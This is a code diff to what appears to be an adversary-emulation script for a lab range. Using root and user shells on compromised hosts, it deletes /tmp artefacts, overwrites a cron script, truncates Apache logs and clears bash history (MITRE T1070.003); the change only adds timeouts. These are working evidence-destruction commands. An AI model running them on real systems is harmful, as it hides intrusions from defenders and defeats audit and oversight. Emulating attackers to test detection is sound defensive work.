@@ -66,7 +66,7 @@ def _apache_delete_artifacts(root_shell):
     log("[*] Removing /tmp artefacts from apache ...")
     for path in _APACHE_TMP_ARTIFACTS:
         # No -f: missing-file errors are the point — they show up in history.
-        out = run_remote(root_shell, f"rm {path} 2>&1 || true")
+        out = run_remote(root_shell, f"rm {path} 2>&1 || true", timeout=10)
         if "No such file" in out or "cannot remove" in out:
             log(f"[-] {path}: already gone — rm error left in history")
         else:
@@ -88,6 +88,7 @@ def _apache_sanitise_cron_script(root_shell):
         f"&& echo '# maintenance placeholder' >> {CRON_SCRIPT} "
         f"&& echo 'exit 0' >> {CRON_SCRIPT} "
         f"&& echo CRON_OK || echo CRON_FAIL",
+        timeout=10,
     )
     if "CRON_OK" in out:
         log(
@@ -109,13 +110,14 @@ def _apache_truncate_logs(root_shell):
     listing = run_remote(
         root_shell,
         f"find {APACHE_LOGDIR} -maxdepth 1 -type f -name '*.log' 2>/dev/null",
+        timeout=10,
     )
     log_files = [l.strip() for l in listing.splitlines() if l.strip()]
     if not log_files:
         log(f"[-] No *.log files found in {APACHE_LOGDIR}")
         return
     for log_file in log_files:
-        out = run_remote(root_shell, f"> {log_file} && echo TRUNC_OK || echo TRUNC_FAIL")
+        out = run_remote(root_shell, f"> {log_file} && echo TRUNC_OK || echo TRUNC_FAIL", timeout=10)
         if "TRUNC_OK" in out:
             log(f"[+] {log_file}: truncated (FIM records mtime change; Docker logs already captured)")
         else:
@@ -129,10 +131,11 @@ def _apache_clear_history(root_shell):
     HISTFILE is truncated, so they remain visible until the shell exits.
     """
     log("[*] Clearing bash history on apache (root) ...")
-    run_remote(root_shell, "history -c")
+    run_remote(root_shell, "history -c", timeout=10)
     out = run_remote(
         root_shell,
         "cat /dev/null > ~/.bash_history && echo HIST_OK || echo HIST_FAIL",
+        timeout=10,
     )
     if "HIST_OK" in out:
         log("[+] ~/.bash_history: truncated (clear commands already in session buffer)")
@@ -152,7 +155,7 @@ def _workstation_delete_artifacts(john_shell):
     """
     log("[*] Removing /tmp artefacts from workstation ...")
     for path in _WORKSTATION_TMP_ARTIFACTS:
-        out = run_remote(john_shell, f"rm {path} 2>&1 || true")
+        out = run_remote(john_shell, f"rm {path} 2>&1 || true", timeout=10)
         if "No such file" in out or "cannot remove" in out:
             log(f"[-] {path}: already gone — rm error left in history")
         else:
@@ -190,10 +193,11 @@ def _workstation_attempt_log_wipe(john_shell):
 def _workstation_clear_history(john_shell):
     """Clear john.stravidis's bash history (T1070.003)."""
     log("[*] Clearing bash history on workstation (john.stravidis) ...")
-    run_remote(john_shell, "history -c")
+    run_remote(john_shell, "history -c", timeout=10)
     out = run_remote(
         john_shell,
         "cat /dev/null > ~/.bash_history && echo HIST_OK || echo HIST_FAIL",
+        timeout=10,
     )
     if "HIST_OK" in out:
         log("[+] ~/.bash_history: truncated (clear commands already in session buffer)")
